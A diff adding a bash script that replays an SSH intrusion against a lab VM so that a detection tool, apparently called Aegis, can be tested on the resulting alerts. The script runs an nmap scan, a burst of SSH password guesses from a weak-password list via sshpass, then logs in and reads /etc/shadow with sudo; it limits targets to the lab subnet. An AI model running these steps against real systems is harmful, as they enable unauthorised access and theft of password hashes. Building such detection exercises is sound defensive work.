@@ -1,0 +1,84 @@
+#!/bin/bash
+# aegis-attack - replay a textbook SSH intrusion against the Aegis lab VM, from Kali.
+#
+# It does only what Aegis is built to catch, and only against the lab's own
+# host-only network (192.168.56.0/24); it refuses any other target. Run it on
+# Kali, against aegis-victim (192.168.56.107):
+#
+#     ./aegis-attack 192.168.56.107                 # guesses svc_backup
+#     ./aegis-attack 192.168.56.107 svc_backup      # same, explicit
+#
+# The password that finally works is read from $AEGIS_LAB_PASSWORD, or asked
+# for; it is never written down here. The script, in order:
+#   1. a quick port scan (recon)
+#   2. several wrong SSH passwords for the account (a brute-force burst)
+#   3. the right password -> a login -> `sudo cat /etc/shadow`
+# which is the brute-force -> login -> sensitive-read story the manager alerts
+# on. Then pull the alerts into Aegis and work the incident as usual.
+#
+# This is for your own lab. Do not point it at anything you do not own.
+
+set -uo pipefail
+
+LAB_SUBNET="192.168.56."
+TARGET="${1:-}"
+USER_NAME="${2:-svc_backup}"
+# Common weak passwords, tried before the real one so the manager sees a burst of failures.
+DECOYS=(123456 password admin letmein backup123 qwerty root changeme)
+
+die() { printf 'aegis-attack: %s\n' "$*" >&2; exit 1; }
+
+[[ -n "$TARGET" ]] || die "usage: ./aegis-attack <victim-ip in 192.168.56.0/24> [user]"
+[[ "$TARGET" == "$LAB_SUBNET"* ]] || die "refusing '$TARGET': only the lab network ${LAB_SUBNET}0/24 is allowed"
+[[ "$USER_NAME" =~ ^[a-z_][a-z0-9_-]{0,31}$ ]] || die "not a valid user name: $USER_NAME"
+command -v sshpass >/dev/null || die "sshpass is needed: sudo apt install -y sshpass"
+command -v ssh     >/dev/null || die "the ssh client is needed"
+
+PASS="${AEGIS_LAB_PASSWORD:-}"
+if [[ -z "$PASS" ]]; then
+    read -r -s -p "Password for $USER_NAME on $TARGET (the one the attack 'guesses'): " PASS; echo
+fi
+[[ -n "$PASS" ]] || die "no password given"
+
+SSHOPTS=(-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5
+         -o PreferredAuthentications=password -o PubkeyAuthentication=no -o LogLevel=ERROR)
+
+say() { printf '\n=== %s ===\n' "$*"; }
+
+say "1. Recon: a quick port scan of $TARGET"
+if command -v nmap >/dev/null; then
+    nmap -Pn -p 22,80,443,2222 "$TARGET" 2>/dev/null | sed -n '/PORT/,/^$/p'
+else
+    echo "(nmap not installed; skipping the scan)"
+fi
+
+say "2. Guessing $USER_NAME's password (${#DECOYS[@]} wrong tries, then the real one)"
+for pw in "${DECOYS[@]}"; do
+    if sshpass -p "$pw" ssh "${SSHOPTS[@]}" "$USER_NAME@$TARGET" true 2>/dev/null; then
+        echo "  [$pw] unexpectedly worked - stopping"; exit 0
+    fi
+    echo "  [$pw] failed"
+    sleep 1
+done
+
+say "3. The real password: login, then read /etc/shadow with sudo"
+# The password goes to the remote 'sudo -S' over stdin, not on the command line.
+out="$(sshpass -p "$PASS" ssh "${SSHOPTS[@]}" "$USER_NAME@$TARGET" \
+        "echo '--- whoami ---'; id; echo '--- /etc/shadow (first lines) ---'; sudo -S -p '' cat /etc/shadow 2>/dev/null | head -n 3" \
+        <<< "$PASS" 2>/dev/null)" || die "login as $USER_NAME failed - is the password right and SSH password login on?"
+echo "$out"
+
+say "Done"
+cat <<NOTE
+The manager should now show: repeated SSH auth failures for $USER_NAME from this
+machine, a successful login, and a sudo read of /etc/shadow. Pull them into Aegis
+and work the incident:
+
+  # on the laptop
+  python -m aegis watch --once            # or your usual alert export + ingest
+  python -m aegis decide --all
+  python -m aegis serve --dir runs\\live   # open http://127.0.0.1:8765/
+
+Aegis should score it critical and suggest: lock_account $USER_NAME, and block_ip
+for this machine's lab address. Approve and act to carry them out.
+NOTE
